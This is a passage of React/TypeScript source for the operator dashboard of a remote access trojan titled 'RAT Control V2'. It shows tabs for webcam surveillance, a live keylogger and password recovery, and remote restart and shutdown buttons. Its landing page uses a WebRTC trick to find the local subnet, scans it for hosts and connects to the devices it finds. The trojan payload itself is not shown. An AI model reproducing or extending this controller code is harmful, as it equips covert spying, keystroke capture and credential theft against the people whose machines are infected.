                  ? "bg-blue-600 shadow-lg shadow-blue-900/50 text-white"
                  : "text-slate-400 hover:bg-slate-800 hover:text-white"
              } ${isCollapsed ? "justify-center px-2" : ""}`}
              title={isCollapsed ? item.label : ""}
            >
              <item.icon size={20} />
              {!isCollapsed && (
                <span className="whitespace-nowrap">{item.label}</span>
              )}
            </button>
          ))}
        </nav>

        <div className="p-4 border-t border-slate-800 space-y-2">
          {!isCollapsed && (
            <p className="text-xs font-bold text-slate-500 uppercase px-2 mb-2 whitespace-nowrap">
              Power
            </p>
          )}
          <div
            className={`grid ${
              isCollapsed ? "grid-cols-1" : "grid-cols-2"
            } gap-2`}
          >
            <button
              onClick={() =>
                confirm("Restart?") && ctrl.actions.sendCommand("restart")
              }
              className="bg-amber-500/10 hover:bg-amber-500 text-amber-500 hover:text-white p-2 rounded-lg transition-colors flex flex-col items-center gap-1 text-xs font-bold"
              title="Restart"
            >
              <RefreshCw size={18} /> {!isCollapsed && "Restart"}
            </button>
            <button
              onClick={() =>
                confirm("Shutdown?") && ctrl.actions.sendCommand("shutdown")
              }
              className="bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white p-2 rounded-lg transition-colors flex flex-col items-center gap-1 text-xs font-bold"
              title="Shutdown"
            >
              <Power size={18} /> {!isCollapsed && "Shutdown"}
            </button>
          </div>
        </div>
      </aside>
      <main className="flex-1 flex flex-col min-w-0 overflow-hidden relative">
        <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 pointer-events-none"></div>
        <header className="h-16 bg-white/80 backdrop-blur border-b border-slate-200 flex items-center justify-between px-8 flex-none z-10">
          <h2 className="text-xl font-bold text-slate-800">
            {activeTab === "sys" && "System Management"}
            {activeTab === "cam" && "Surveillance Center"}
            {activeTab === "key" && "Live Keylogger"}
            {activeTab === "pass" && "Password Recovery"}
          </h2>
        </header>
        <div
          className={`flex-1 p-6 ${
            activeTab === "cam" ? "overflow-y-auto" : "overflow-hidden"
          }`}
        >
          {activeTab === "sys" && <TabSystem ctrl={ctrl} />}
          {activeTab === "cam" && <TabSurveillance ctrl={ctrl} />}
          {activeTab === "key" && <TabKeylogger ctrl={ctrl} />}
          {activeTab === "pass" && <TabPasswords ctrl={ctrl} />}
        </div>
      </main>
    </div>
  );
};

const LandingPage = ({
  ctrl,
}: {
  ctrl: ReturnType<typeof useRemoteControl>;
}) => {
  const [ip, setIp] = useState("localhost");
  const [subnet, setSubnet] = useState("192.168.1.");

  useEffect(() => {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer().then((o) => pc.setLocalDescription(o));
    pc.onicecandidate = (e) => {
      if (!e.candidate) return;
      const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if (match) {
        const myIp = match[1];
        if (myIp.startsWith("192.168.") || myIp.startsWith("10.")) {
          const parts = myIp.split(".");
          parts.pop();
          setSubnet(parts.join(".") + ".");
        }
      }
    };
  }, []);

  return (
    <div className="min-h-screen bg-slate-900 flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-tr from-blue-900/20 to-purple-900/20"></div>
      <div className="max-w-md w-full relative z-10 bg-white/5 backdrop-blur-xl border border-white/10 p-8 rounded-3xl shadow-2xl">
        <div className="text-center space-y-6">
          <div className="inline-flex p-4 rounded-2xl bg-gradient-to-br from-blue-500 to-purple-600 shadow-lg shadow-blue-500/30">
            <Ghost size={48} className="text-white" />
          </div>
          <div>
            <h1 className="text-3xl font-bold text-white tracking-tight">
              RAT Control V2
            </h1>
          </div>
          <div className="space-y-4 pt-4">
            <div className="bg-slate-800/50 p-4 rounded-xl border border-white/5">
              <div className="flex gap-2 mb-3">
                <input
                  type="text"
                  value={subnet}
                  onChange={(e) => setSubnet(e.target.value)}
                  className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-white text-sm font-mono outline-none focus:border-blue-500"
                  placeholder="Subnet..."
                />
                <button
                  onClick={() => ctrl.actions.scanNetwork(subnet)}
                  disabled={ctrl.data.isScanning}
                  className="bg-blue-600 hover:bg-blue-500 text-white px-3 py-2 rounded-lg text-xs font-bold transition-all disabled:opacity-50 flex items-center gap-1"
                >
                  {ctrl.data.isScanning ? (
                    <RefreshCw className="animate-spin" size={14} />
                  ) : (
                    <Search size={14} />
                  )}{" "}
                  SCAN
                </button>
              </div>
              <div className="grid grid-cols-2 gap-2 max-h-32 overflow-y-auto scrollbar-thin scrollbar-thumb-slate-600">
                {ctrl.data.scanResults.map((foundIp) => (
                  <button
                    key={foundIp}
                    onClick={() => {
                      setIp(foundIp);
                      ctrl.actions.connect(foundIp);
                    }}
                    className="flex items-center gap-2 bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/30 px-3 py-2 rounded-lg transition-all group"
                  >
                    <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
                    <span className="text-emerald-400 group-hover:text-emerald-300 text-xs font-mono">
                      {foundIp}
                    </span>
                  </button>
                ))}
              </div>
            </div>
            <div className="space-y-2 text-left">
              <div className="relative group">
                <Wifi
                  className="absolute left-4 top-3.5 text-slate-500 group-focus-within:text-blue-400 transition-colors"
                  size={20}
                />
                <input
                  type="text"
                  value={ip}
                  onChange={(e) => setIp(e.target.value)}
                  className="w-full pl-12 pr-4 py-3 bg-slate-800/50 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                />
              </div>
            </div>
            <button
              onClick={() => ctrl.actions.connect(ip)}
              className="w-full py-3.5 rounded-xl font-bold text-white bg-gradient-to-r from-blue-600 to-blue-500 hover:shadow-lg hover:shadow-blue-500/40 hover:-translate-y-0.5 transition-all duration-300"
            >
              Connect to Device
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default function App() {
  const ctrl = useRemoteControl();
  if (ctrl.status !== "CONNECTED") return <LandingPage ctrl={ctrl} />;
  return <Dashboard ctrl={ctrl} />;
}
